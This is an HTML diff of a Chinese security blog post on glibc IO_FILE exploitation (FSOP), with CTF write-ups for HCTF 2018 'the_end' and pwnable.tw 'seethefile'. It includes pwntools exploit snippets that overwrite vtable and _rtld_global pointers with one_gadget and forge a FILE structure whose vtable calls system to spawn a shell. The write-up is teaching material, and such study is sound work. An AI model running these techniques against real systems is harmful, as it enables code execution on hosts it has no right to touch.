@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>pwn_with_io_file - Watch Security</title>
+
+<meta name="keywords" content="pwn io file">
+
+<meta name="description " content="">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">Tech and Eesay</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-09-21">2019-09-21</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">Pwn_with_IO_FILE</h2>
+            <div class="post-meta">
+                本文总共2738个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="利用IO-file进行pwn"><a href="#利用IO-file进行pwn" class="headerlink" title="利用IO file进行pwn"></a>利用IO file进行pwn</h3><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><ul>
+<li><p>glibc对所有用户产生的FILE结构进行维护，内存分配在heap中，且以链表形式维护（FILE有chain域），io_list_all为链表头。</p>
+</li>
+<li><p>但是在FILE结构外另有io_file_plus结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其中vtables保存着标准io函数调用的函数指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们能够利用的方式就是三个思路，要么覆盖真实的vtables里的函数指针，要么伪造vtables；再或者针对链表io_list_all，该值时libc.so的全局变量，如果我们伪造一个，就可以控制伪造file结构及vtables，这就是<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop-zh/" target="_blank" rel="noopener">FSOP攻击</a>（当然需要一些验证）</p>
+</li>
+</ul>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><ul>
+<li><h5 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h5><ul>
+<li><p>漏洞分析，存在一个任意地址写漏洞，可以5次，每次1byte。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/6.png" title="[]">
+</li>
+<li><p>利用思路A</p>
+<ul>
+<li><p>利用IO FILE，在exit之后，会调用file_list_all里的函数setbuf。如果我们可以伪造setbuf为one_gadgets就可以利用。</p>
+</li>
+<li><p>坑点1，寻找vtables在libc.so文件的偏移（存储vtbales地址的地址）。</p>
+<ul>
+<li><p>下面的都是假的</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/1.png" title="[]">
+<img src="/2019/09/21/Pwn-with-IO-FILE/2.png" title="[]">
+</li>
+<li><p>这个才是真的</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/3.png" title="[]">
+</li>
+</ul>
+</li>
+<li><p>坑点2，伪造vtables。需要满足我们能够写入的字节数目，在真实的vtables附近寻找。且0x68偏移的位置的值与one_gadget值相差3byte内。</p>
+</li>
+</ul>
+</li>
+<li><p>exp记录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  vtables_addr = libc_base + <span class="number">0x3c56f8</span></span><br><span class="line">  one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line">  fake_vtables = libc_base + <span class="number">0x3c5588</span></span><br><span class="line">target_addr = fake_vtables + <span class="number">0x58</span> 				<span class="comment">#setbuf</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">"one_gadget ==&gt; "</span> + hex(one_gadget)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"vtables ==&gt; "</span> + hex(vtables_addr)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"fake_vtables ==&gt; "</span> + hex(fake_vtables)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"target_addr ==&gt; "</span> + hex(target_addr)</span><br><span class="line">  </span><br><span class="line">  dbg()</span><br><span class="line">  p.recvline()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):								<span class="comment">#make a  fake_vtables</span></span><br><span class="line">  	p.send(p64(vtables_addr+i))</span><br><span class="line">  	p.send(p64(fake_vtables)[i])</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):								<span class="comment">#make setbuf is one_gadget</span></span><br><span class="line">  	p.send(p64(target_addr+i))</span><br><span class="line">  	p.send(p64(one_gadget)[i])</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>利用思路B</p>
+<ul>
+<li><p>利用exit函数退出时会调用_dl_fini_函数，里面会有一个函数指针，_rtdl_global的一个偏移。调试获得之后，改写这里为one_gadget即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span></span><br><span class="line">target = libc.address + <span class="number">0x5f0f48</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    p.send(p64(target + i))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(one_gadget[i])</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><h5 id="pwntable的seethefile"><a href="#pwntable的seethefile" class="headerlink" title="pwntable的seethefile"></a>pwntable的seethefile</h5><ul>
+<li><p>漏洞分析，name字段scanf存在溢出，可以覆盖fd，伪造一个FILE结构。可以利用flush或者close达到任意代码执行的目的。</p>
+<img src="/2019/09/21/Pwn-with-IO-FILE/7.png" title="[]">
+<img src="/2019/09/21/Pwn-with-IO-FILE/8.png" title="[]">
+</li>
+<li><p>利用过程</p>
+<ul>
+<li><p>伪造file结构</p>
+<ul>
+<li>设置_flags &amp; 0x2000 = 0</li>
+<li>设置read_ptr为”;sh”</li>
+<li>伪造vtable，设置flush字段为system</li>
+</ul>
+</li>
+<li><p>exp记录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fd_addr = <span class="number">0x0804B280</span></span><br><span class="line">fake_file_addr = <span class="number">0x0804B300</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">name += p32(fake_file_addr)		<span class="comment">#*fd = fake_file_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line">fake_file = <span class="string">"\x00"</span> * (fake_file_addr - fd_addr <span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#file struct</span></span><br><span class="line">fake_file += ((p32(<span class="number">0xffffdfff</span>) + <span class="string">";sh"</span>).ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake vtable_addr</span></span><br><span class="line">fake_file += p32(fake_file_addr + <span class="number">0x98</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_vtables		</span></span><br><span class="line">fake_file += p32(system_addr)*<span class="number">21</span></span><br><span class="line">exit(name + fake_file)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h4><ul>
+<li><a href="https://www.jianshu.com/p/a6354fa4dbdf" target="_blank" rel="noopener">IO_FILE通用利用模板</a></li>
+<li></li>
+</ul>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="../../../../tags/pwn/">pwn</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
